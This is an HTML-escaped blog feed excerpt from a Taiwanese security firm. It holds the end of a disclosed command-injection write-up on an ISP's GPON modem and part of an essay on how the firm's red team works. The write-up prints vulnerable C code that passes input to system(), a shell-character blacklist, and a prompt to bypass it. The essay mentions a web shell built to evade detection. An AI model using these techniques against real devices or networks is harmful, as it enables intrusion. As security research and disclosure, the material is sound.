&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;with_fallback&lt;/code&gt; 大致邏輯如下，由於當時 Ghidra 尚未出現，所以這份原始碼是從閱讀 MIPS 組合語言慢慢還原回來的! 其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;s1&lt;/code&gt; 為輸入的指令，如果指令不在定義好的列表內以及指令中出現問號的話，就與 &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/diag&lt;/code&gt; 拼湊起來丟入 &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; 執行! 理所當然，為了防止命令注入等相關弱點，在丟入 &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; 前會先根據 &lt;code class=&quot;highlighter-rouge&quot;&gt;BLACKLISTS&lt;/code&gt; 的列表檢查是否存在有害字元。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;util_trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;\0&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;#&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      
  &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
  
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;util_fdprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;invalid char &#39;%c&#39; in command&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  
  &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/tmp/tmpfile.%d.%06ld&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/diag %s &amp;gt; %s 2&amp;gt;/dev/null&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;而 &lt;code class=&quot;highlighter-rouge&quot;&gt;BLACKLISTS&lt;/code&gt; 定義如下:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|&amp;lt;&amp;gt;(){}`;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果是你的話，能想到如何繞過嗎?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;答案很簡單，命令注入往往就是這麼的簡單且樸實無華!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;這裡我們示範了如何從 PTT 知道受害者 IP 地址，到進入它數據機實現真正意義上的「指哪打哪」!&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Pq00YUoBOsQ&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;後記&quot;&gt;後記&lt;/h2&gt;

&lt;p&gt;故事到這邊差不多進入尾聲，整篇文章看似輕描淡寫，描述一個漏洞從發現到利用的整個經過，從結果論來說也許只是一個簡單的命令注入，但實際上中間所花的時間、走過的歪路是正在讀文章的你無法想像的，就像是在黑暗中走迷宮，在沒有走出迷宮前永遠不會知道自己正在走的這條路是不是通往目的正確道路!&lt;/p&gt;

&lt;p&gt;挖掘出新的漏洞，並不是一件容易的事，尤其是在各式攻擊手法又已趨於成熟的今天，要想出全新的攻擊手法更是難上加難! 在漏洞研究的領域上，台灣尚未擁有足夠的能量，如果平常的挑戰已經滿足不了你，想體驗真實世界的攻防，歡迎加入與我們一起交流蕉流 :D&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;通報時程&quot;&gt;通報時程&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2019 年 07 月 28 日 - 透過 TWCERT/CC 回報中華電信&lt;/li&gt;
  &lt;li&gt;2019 年 08 月 14 日 - 廠商回覆清查並修補設備中&lt;/li&gt;
  &lt;li&gt;2019 年 08 月 27 日 - 廠商回覆九月初修補完畢&lt;/li&gt;
  &lt;li&gt;2019 年 08 月 30 日 - 廠商回覆已完成受影響設備的韌體更新&lt;/li&gt;
  &lt;li&gt;2019 年 09 月 11 日 - 廠商回覆部分用戶需派員更新, 延後公開時間&lt;/li&gt;
  &lt;li&gt;2019 年 09 月 23 日 - 與 TWCERT/CC 確認可公開&lt;/li&gt;
  &lt;li&gt;2019 年 09 月 25 日 - 發表至 DEVCORE Conference 2019&lt;/li&gt;
  &lt;li&gt;2019 年 11 月 11 日 - 部落格文章釋出&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/11/11/HiNet-GPON-Modem-RCE/</link>
                <guid>https://devco.re/blog/2019/11/11/HiNet-GPON-Modem-RCE</guid>
                <pubDate>Mon, 11 Nov 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 紅隊的進化，與下一步</title>
                <description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;「紅隊演練」近年來漸漸開始被大家提及，也開始有一些廠商推出紅隊服務。不過關於在台灣紅隊是怎麼做的就比較少人公開分享，身為第一個在台灣推紅隊演練的公司，我想就根據這兩年多來的實戰經驗，分享為什麼我們要做紅隊、我們面臨到的問題、以及在我們心中認為紅隊成員應該具備的特質。最後再分享我們現階段看到的企業資安問題，期望未來我們也可以透過紅隊演練來幫助企業補足那些問題。&lt;/p&gt;

&lt;p&gt;這一篇是我在 &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE Conference 2019&lt;/a&gt; 所分享的主題。研討會事前調查想聽內容時有些朋友希望我們能介紹 DEVCORE 的紅隊，還有運作方式和案例，所以我抽出一些素材整理成這場演講。下面是投影片連結，其中有些內部系統畫面不對外公開，僅在研討會分享敬請見諒。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/conf/2019/slides/devcore-conf-2019-shaolin-DEVCORE%20%E7%B4%85%E9%9A%8A%E7%9A%84%E9%80%B2%E5%8C%96%EF%BC%8C%E8%88%87%E4%B8%8B%E4%B8%80%E6%AD%A5.pdf&quot;&gt;DEVCORE 紅隊的進化，與下一步 － Shaolin (DEVCORE CONF 2019)&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;為什麼要紅隊演練&quot;&gt;為什麼要紅隊演練？&lt;/h2&gt;

&lt;p&gt;一言以蔽之，就是我們漸漸體會到：&lt;strong&gt;對大企業而言，單純的滲透測試並不是最有效益的&lt;/strong&gt;。從過去上百次滲透測試經驗中，我們往往能在專案初期的偵查階段，發現企業邊界存在嚴重弱點，進而進入內網繞過層層防禦攻擊主要目標。越是龐大的企業，這種狀況會越明顯，因為他們通常有很多對外的網站、網路設備，每一個都可能是風險，即使主要網站防護很完備，駭客只需要從這麼多目標中找到一個問題，就可以對企業造成傷害。今天就算企業對每個服務都獨立做了一次滲透測試，在真實世界中，還是有可能從第三方服務、廠商供應鏈、社交工程等途徑入侵。所以有可能投注很多資源做測試，結果還是發生資安事件。&lt;/p&gt;

&lt;p&gt;於是，我們推出了紅隊演練，希望透過真實的演練幫助企業找到整體架構中脆弱的地方。因此，這個服務關注的是&lt;strong&gt;企業整體的安全性&lt;/strong&gt;，而不再只是單一的網站。&lt;/p&gt;

&lt;p&gt;紅隊演練目標通常是一個情境，例如：駭客有沒有辦法取得民眾個資甚至是信用卡卡號？在演練過程中紅隊會無所不用其極的嘗試驗證企業在乎的情境有沒有可能發生。以剛剛的例子來說，我們會想辦法找到一條路徑取得存放這些訊息的資料庫，去驗證有沒有辦法取得個資及卡號。一般來說，卡號部分都會經過加密，因此在拿下資料庫後我們也會嘗試看看有沒有辦法還原這些卡號。有時候除了找到還原的方法，我們甚至會在過程中發現其他路徑可取得卡號，可能是工程師的 debug 資訊會記錄卡號，或是備份檔在 NAS 裡面有完整卡號，這些可能是連資安負責人都不知道的資訊，也是企業評估風險的盲點。&lt;/p&gt;

&lt;p&gt;到這邊，紅隊演練的效益就很明顯了，紅隊能協助企業全盤評估潛在的重大風險，不再像過去只是單一面向的測試特定網站。除了找到弱點，紅隊更在乎幫企業&lt;strong&gt;驗證入侵的可行性&lt;/strong&gt;，方便企業評估風險以及擬定防禦策略。最後，紅隊往往也能夠在演練過程當中&lt;strong&gt;找出企業風險評估忽略的地方&lt;/strong&gt;，例如剛剛例子提到的備份 NAS，就可能是沒有列入核心系統但又相當重要的伺服器，這一塊也是 DEVCORE 這幾年來確實幫助到客戶的地方。&lt;/p&gt;

&lt;h2 id=&quot;devcore-紅隊的編制&quot;&gt;DEVCORE 紅隊的編制&lt;/h2&gt;

&lt;p&gt;基本上，DEVCORE 的紅隊成員都是可以獨當一面的，在執行一般專案時成員間並沒有顯著差異。但在演練範圍比較大的狀況下，就會開始有明顯的分工作業，各組也會專精技能增加團隊效率。目前我們的編制共分為五組：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;簡單介紹職責如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Intelligence (偵查)，負責情報偵查，他們會去收集跟目標有關的所有資訊，包括 IP 網段、網站個別使用的技術，甚至是洩漏的帳號密碼。&lt;/li&gt;
  &lt;li&gt;Special Force (特攻)，有比較強大的攻擊能力，主要負責打破現況，例如攻下第一個據點、拿下另一個網段、或是主機的提權。&lt;/li&gt;
  &lt;li&gt;Regular Army (常規)，負責拿下據點後掃蕩整個戰場，嘗試橫向移動，會盡量多建立幾個據點讓特攻組有更多資源朝任務目標邁進。&lt;/li&gt;
  &lt;li&gt;Suppert (支援)，重要的後勤工作，維持據點的可用性，同時也要觀察記錄整個戰況，最清楚全局戰況。&lt;/li&gt;
  &lt;li&gt;Research (研究)，平時研究各種在紅隊中會用到的武器，演練時期碰到具戰略價值的系統，會投入資源開採 0-day。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;devcore-紅隊的進化&quot;&gt;DEVCORE 紅隊的進化&lt;/h2&gt;

&lt;p&gt;所謂的進化，就是碰到了問題，想辦法強化並且解決，那我們遇到了哪些問題呢？&lt;/p&gt;

&lt;h3 id=&quot;如何找到一個突破點&quot;&gt;如何找到一個突破點？&lt;/h3&gt;

&lt;p&gt;這是大家最常碰到的問題，萬事起頭難，怎麼樣找到第一個突破點？這個問題在紅隊演練當中難度會更高，因為有規模的企業早已投入資源在資安檢測和防護上，我們要怎麼樣從層層防禦當中找到弱點？要能找到別人找不到的弱點，測試思維和方法一定要跟別人不一樣。於是，我們投入資源在偵查、特攻、研究組：偵查部分研究了不同的偵查方法和來源，並且開發自己的工具讓偵查更有效率；我們的特攻組也不斷強化自己的攻擊能力；最重要的，我們讓研究人員開始針對我們常碰到的目標進行研究，開發紅隊會用到的武器或技巧。&lt;/p&gt;

&lt;p&gt;這邊特別想要分享研究組的成果，因為我們會去開採一些基礎設施的 0-day，在負責任的揭露後，會將 1-day 用於演練中，這種模式對國外紅隊來說算是相當少見。為了能幫助到紅隊，研究組平時的研究方向，通常都是找企業外網可以碰到的通用服務，例如郵件伺服器、Jenkins、SSL VPN。我們找的弱點都是以不用認證、可取得伺服器控制權為優先，目前已公開的有：&lt;a href=&quot;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&quot;&gt;Exim&lt;/a&gt;、&lt;a href=&quot;https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;Jenkins&lt;/a&gt;、&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Palo Alto GlobalProtect&lt;/a&gt;、&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;FortiGate&lt;/a&gt;、&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;Pulse Secure&lt;/a&gt;。這些成果在演練當中都有非常非常高的戰略價值，甚至可以說掌控了這些伺服器幾乎就能間接控制企業的大半。&lt;/p&gt;

&lt;p&gt;而這些研究成果，也意外的被國外所注意到：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;PortSwigger 連續兩年年度十大網站攻擊技術評選冠軍 (&lt;a href=&quot;https://portswigger.net/blog/top-10-web-hacking-techniques-of-2017&quot;&gt;2017&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/blog/top-10-web-hacking-techniques-of-2018&quot;&gt;2018&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;連續三年 DEFCON &amp;amp; Black Hat USA 發表 (&lt;a href=&quot;https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages&quot;&gt;2017&lt;/a&gt;, &lt;a href=&quot;https://www.blackhat.com/us-18/briefings/schedule/index.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-days-out-10346&quot;&gt;2018&lt;/a&gt;, &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/index.html#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;2019&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;台灣第一個拿到 PWNIE AWARD 獎項：Pwnie for Best Server-Side Bug (年度最佳伺服器漏洞) (&lt;a href=&quot;https://pwnies.com/archive/2018/nominations/&quot;&gt;2018 入圍&lt;/a&gt;, &lt;a href=&quot;https://pwnies.com/winners/&quot;&gt;2019 得獎&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;目標上萬台如何發揮紅隊效益&quot;&gt;目標上萬台，如何發揮紅「隊」效益？&lt;/h3&gt;

&lt;p&gt;前面靠了偵查、特攻、研究組的成果取得了進入點。下一個問題，是在我們過去的經驗中，有過多次演練的範圍是上萬台電腦，我們要怎樣做才能發揮團隊作戰的效益呢？會有這個問題是因為&lt;strong&gt;數量級&lt;/strong&gt;，如果範圍只有十個網站很容易找目標，但是當網站變多的時候，就很難標註討論我們要攻擊的目標。或是當大家要同步進度的時候，每個人的進度都很多，很難有個地方分享伺服器資訊，讓其他人能接續任務。&lt;/p&gt;

&lt;p&gt;過去我們使用類似 Trello 的系統記錄每台伺服器的狀況，在範圍較小的時候很方便好用，但是當資料量一大就會顯得很難操作。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因此，我們自行開發了系統去解決相關問題。分享一些我們設計系統的必要原則供大家參考：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;伺服器列表可標籤、排序、全文搜尋，火力集中的伺服器必須要自動在顯眼處，省去額外搜尋時間。&lt;/li&gt;
  &lt;li&gt;要可自動建立主機關係圖，方便團隊討論戰況。&lt;/li&gt;
  &lt;li&gt;儲存結構化資訊而非過去的純字串，例如這台機器開的服務資訊、拿 shell 的方式、已滲透的帳號密碼。方便快速釐清目前進度以及事後分析。&lt;/li&gt;
  &lt;li&gt;建立 shell 主控台，方便成員一鍵取得 shell 操作。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;另外還有一個問題，紅隊成員這麼多，戰場又分散，如果想要把我們做過的測試過程記錄下來，不是會很複雜嗎？所以我們另外寫了 plugin 記錄 web 的攻擊流量、以及記錄我們在 shell 下過的指令和伺服器回傳的結果，這些記錄甚至比客戶的 access_log 和 bash_history 還詳細。此外，針對每個目標伺服器，我們也會特別記錄在上面所做過的重要行為，例如：改了什麼設定，新增或刪除了什麼檔案，方便我們還有客戶追蹤。要做這樣的客製化記錄其實是很繁瑣的，對那些習慣於自動化解決事情的駭客更是，但我們就是堅持做好這樣的紀錄，即使客戶沒有要求，我們還是會詳實記錄每個步驟，以備不時之需。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;企業有防禦設備或機制&quot;&gt;企業有防禦設備或機制？&lt;/h3&gt;

&lt;p&gt;解決了突破點和多人合作的問題，接下來我們面臨到第三個問題，企業有防護措施！在研討會中我舉了幾個較客製的真實防禦案例，說明我們除了常見的防禦設備外也擁有很多跟防禦機制交手的經驗。我們會研究每種防禦的特性加以繞過或利用，甚至會寫工具去躲避偵測，最近比較經典的是團隊做了在 Windows 伺服器上的 Web shell，它可以做到 WAF 抓不到，防毒軟體抓不到，也不會有 eventlog 記錄，利用這個工具可以無聲無息收集伺服器上我們需要的資料。當然，我們不是無敵的，一些較底層的偵測機制還是會無法繞過。這邊我直接講我們進化到目前的準則：在面對伺服器防禦機制，我們能隱匿的，一定做到絕對的隱匿，無法躲的，就把流程最佳化，縮短做事情的時間，例如控制在五分鐘內提權拿到關鍵資料，就算被別人抓到也沒關係，因為該拿的資料也拿到了。&lt;/p&gt;

&lt;h2 id=&quot;紅隊成員應具備的特質&quot;&gt;紅隊成員應具備的特質&lt;/h2&gt;

&lt;p&gt;要能夠在紅隊演練中有突出成果，我覺得成員特質是滿關鍵的一個點。以下整理了幾個我從我們紅隊夥伴觀察到的特質跟大家分享，如果將來有打算從事紅隊工作，或是企業已經打算開始成立內部紅隊，這些特質可能可以作為一些參考。&lt;/p&gt;

&lt;h3 id=&quot;想像力&quot;&gt;想像力&lt;/h3&gt;

&lt;p&gt;第一個是想像力，為什麼會提這個特質，因為現在資安意識慢慢強化，要靠一招打天下是不太有機會的，尤其是紅隊演練這麼有變化的工作。要有成果一定要巧妙的組合利用或是繞過才有機會。&lt;/p&gt;

&lt;p&gt;直接舉個例子，我們在公布 Pulse Secure VPN 的&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;研究細節&lt;/a&gt;後，有人在 twitter 上&lt;a href=&quot;https://twitter.com/_trou_/status/1168529031177867267&quot;&gt;表示&lt;/a&gt;那個關鍵用來 RCE 的 argument injection 點之前他有找到，只是無法利用所以官方也沒有修。確實我們找到的地方相同，不過我們靠想像力找到了一個可利用參數並搭配 Perl 的特性串出了 RCE。&lt;br /&gt;
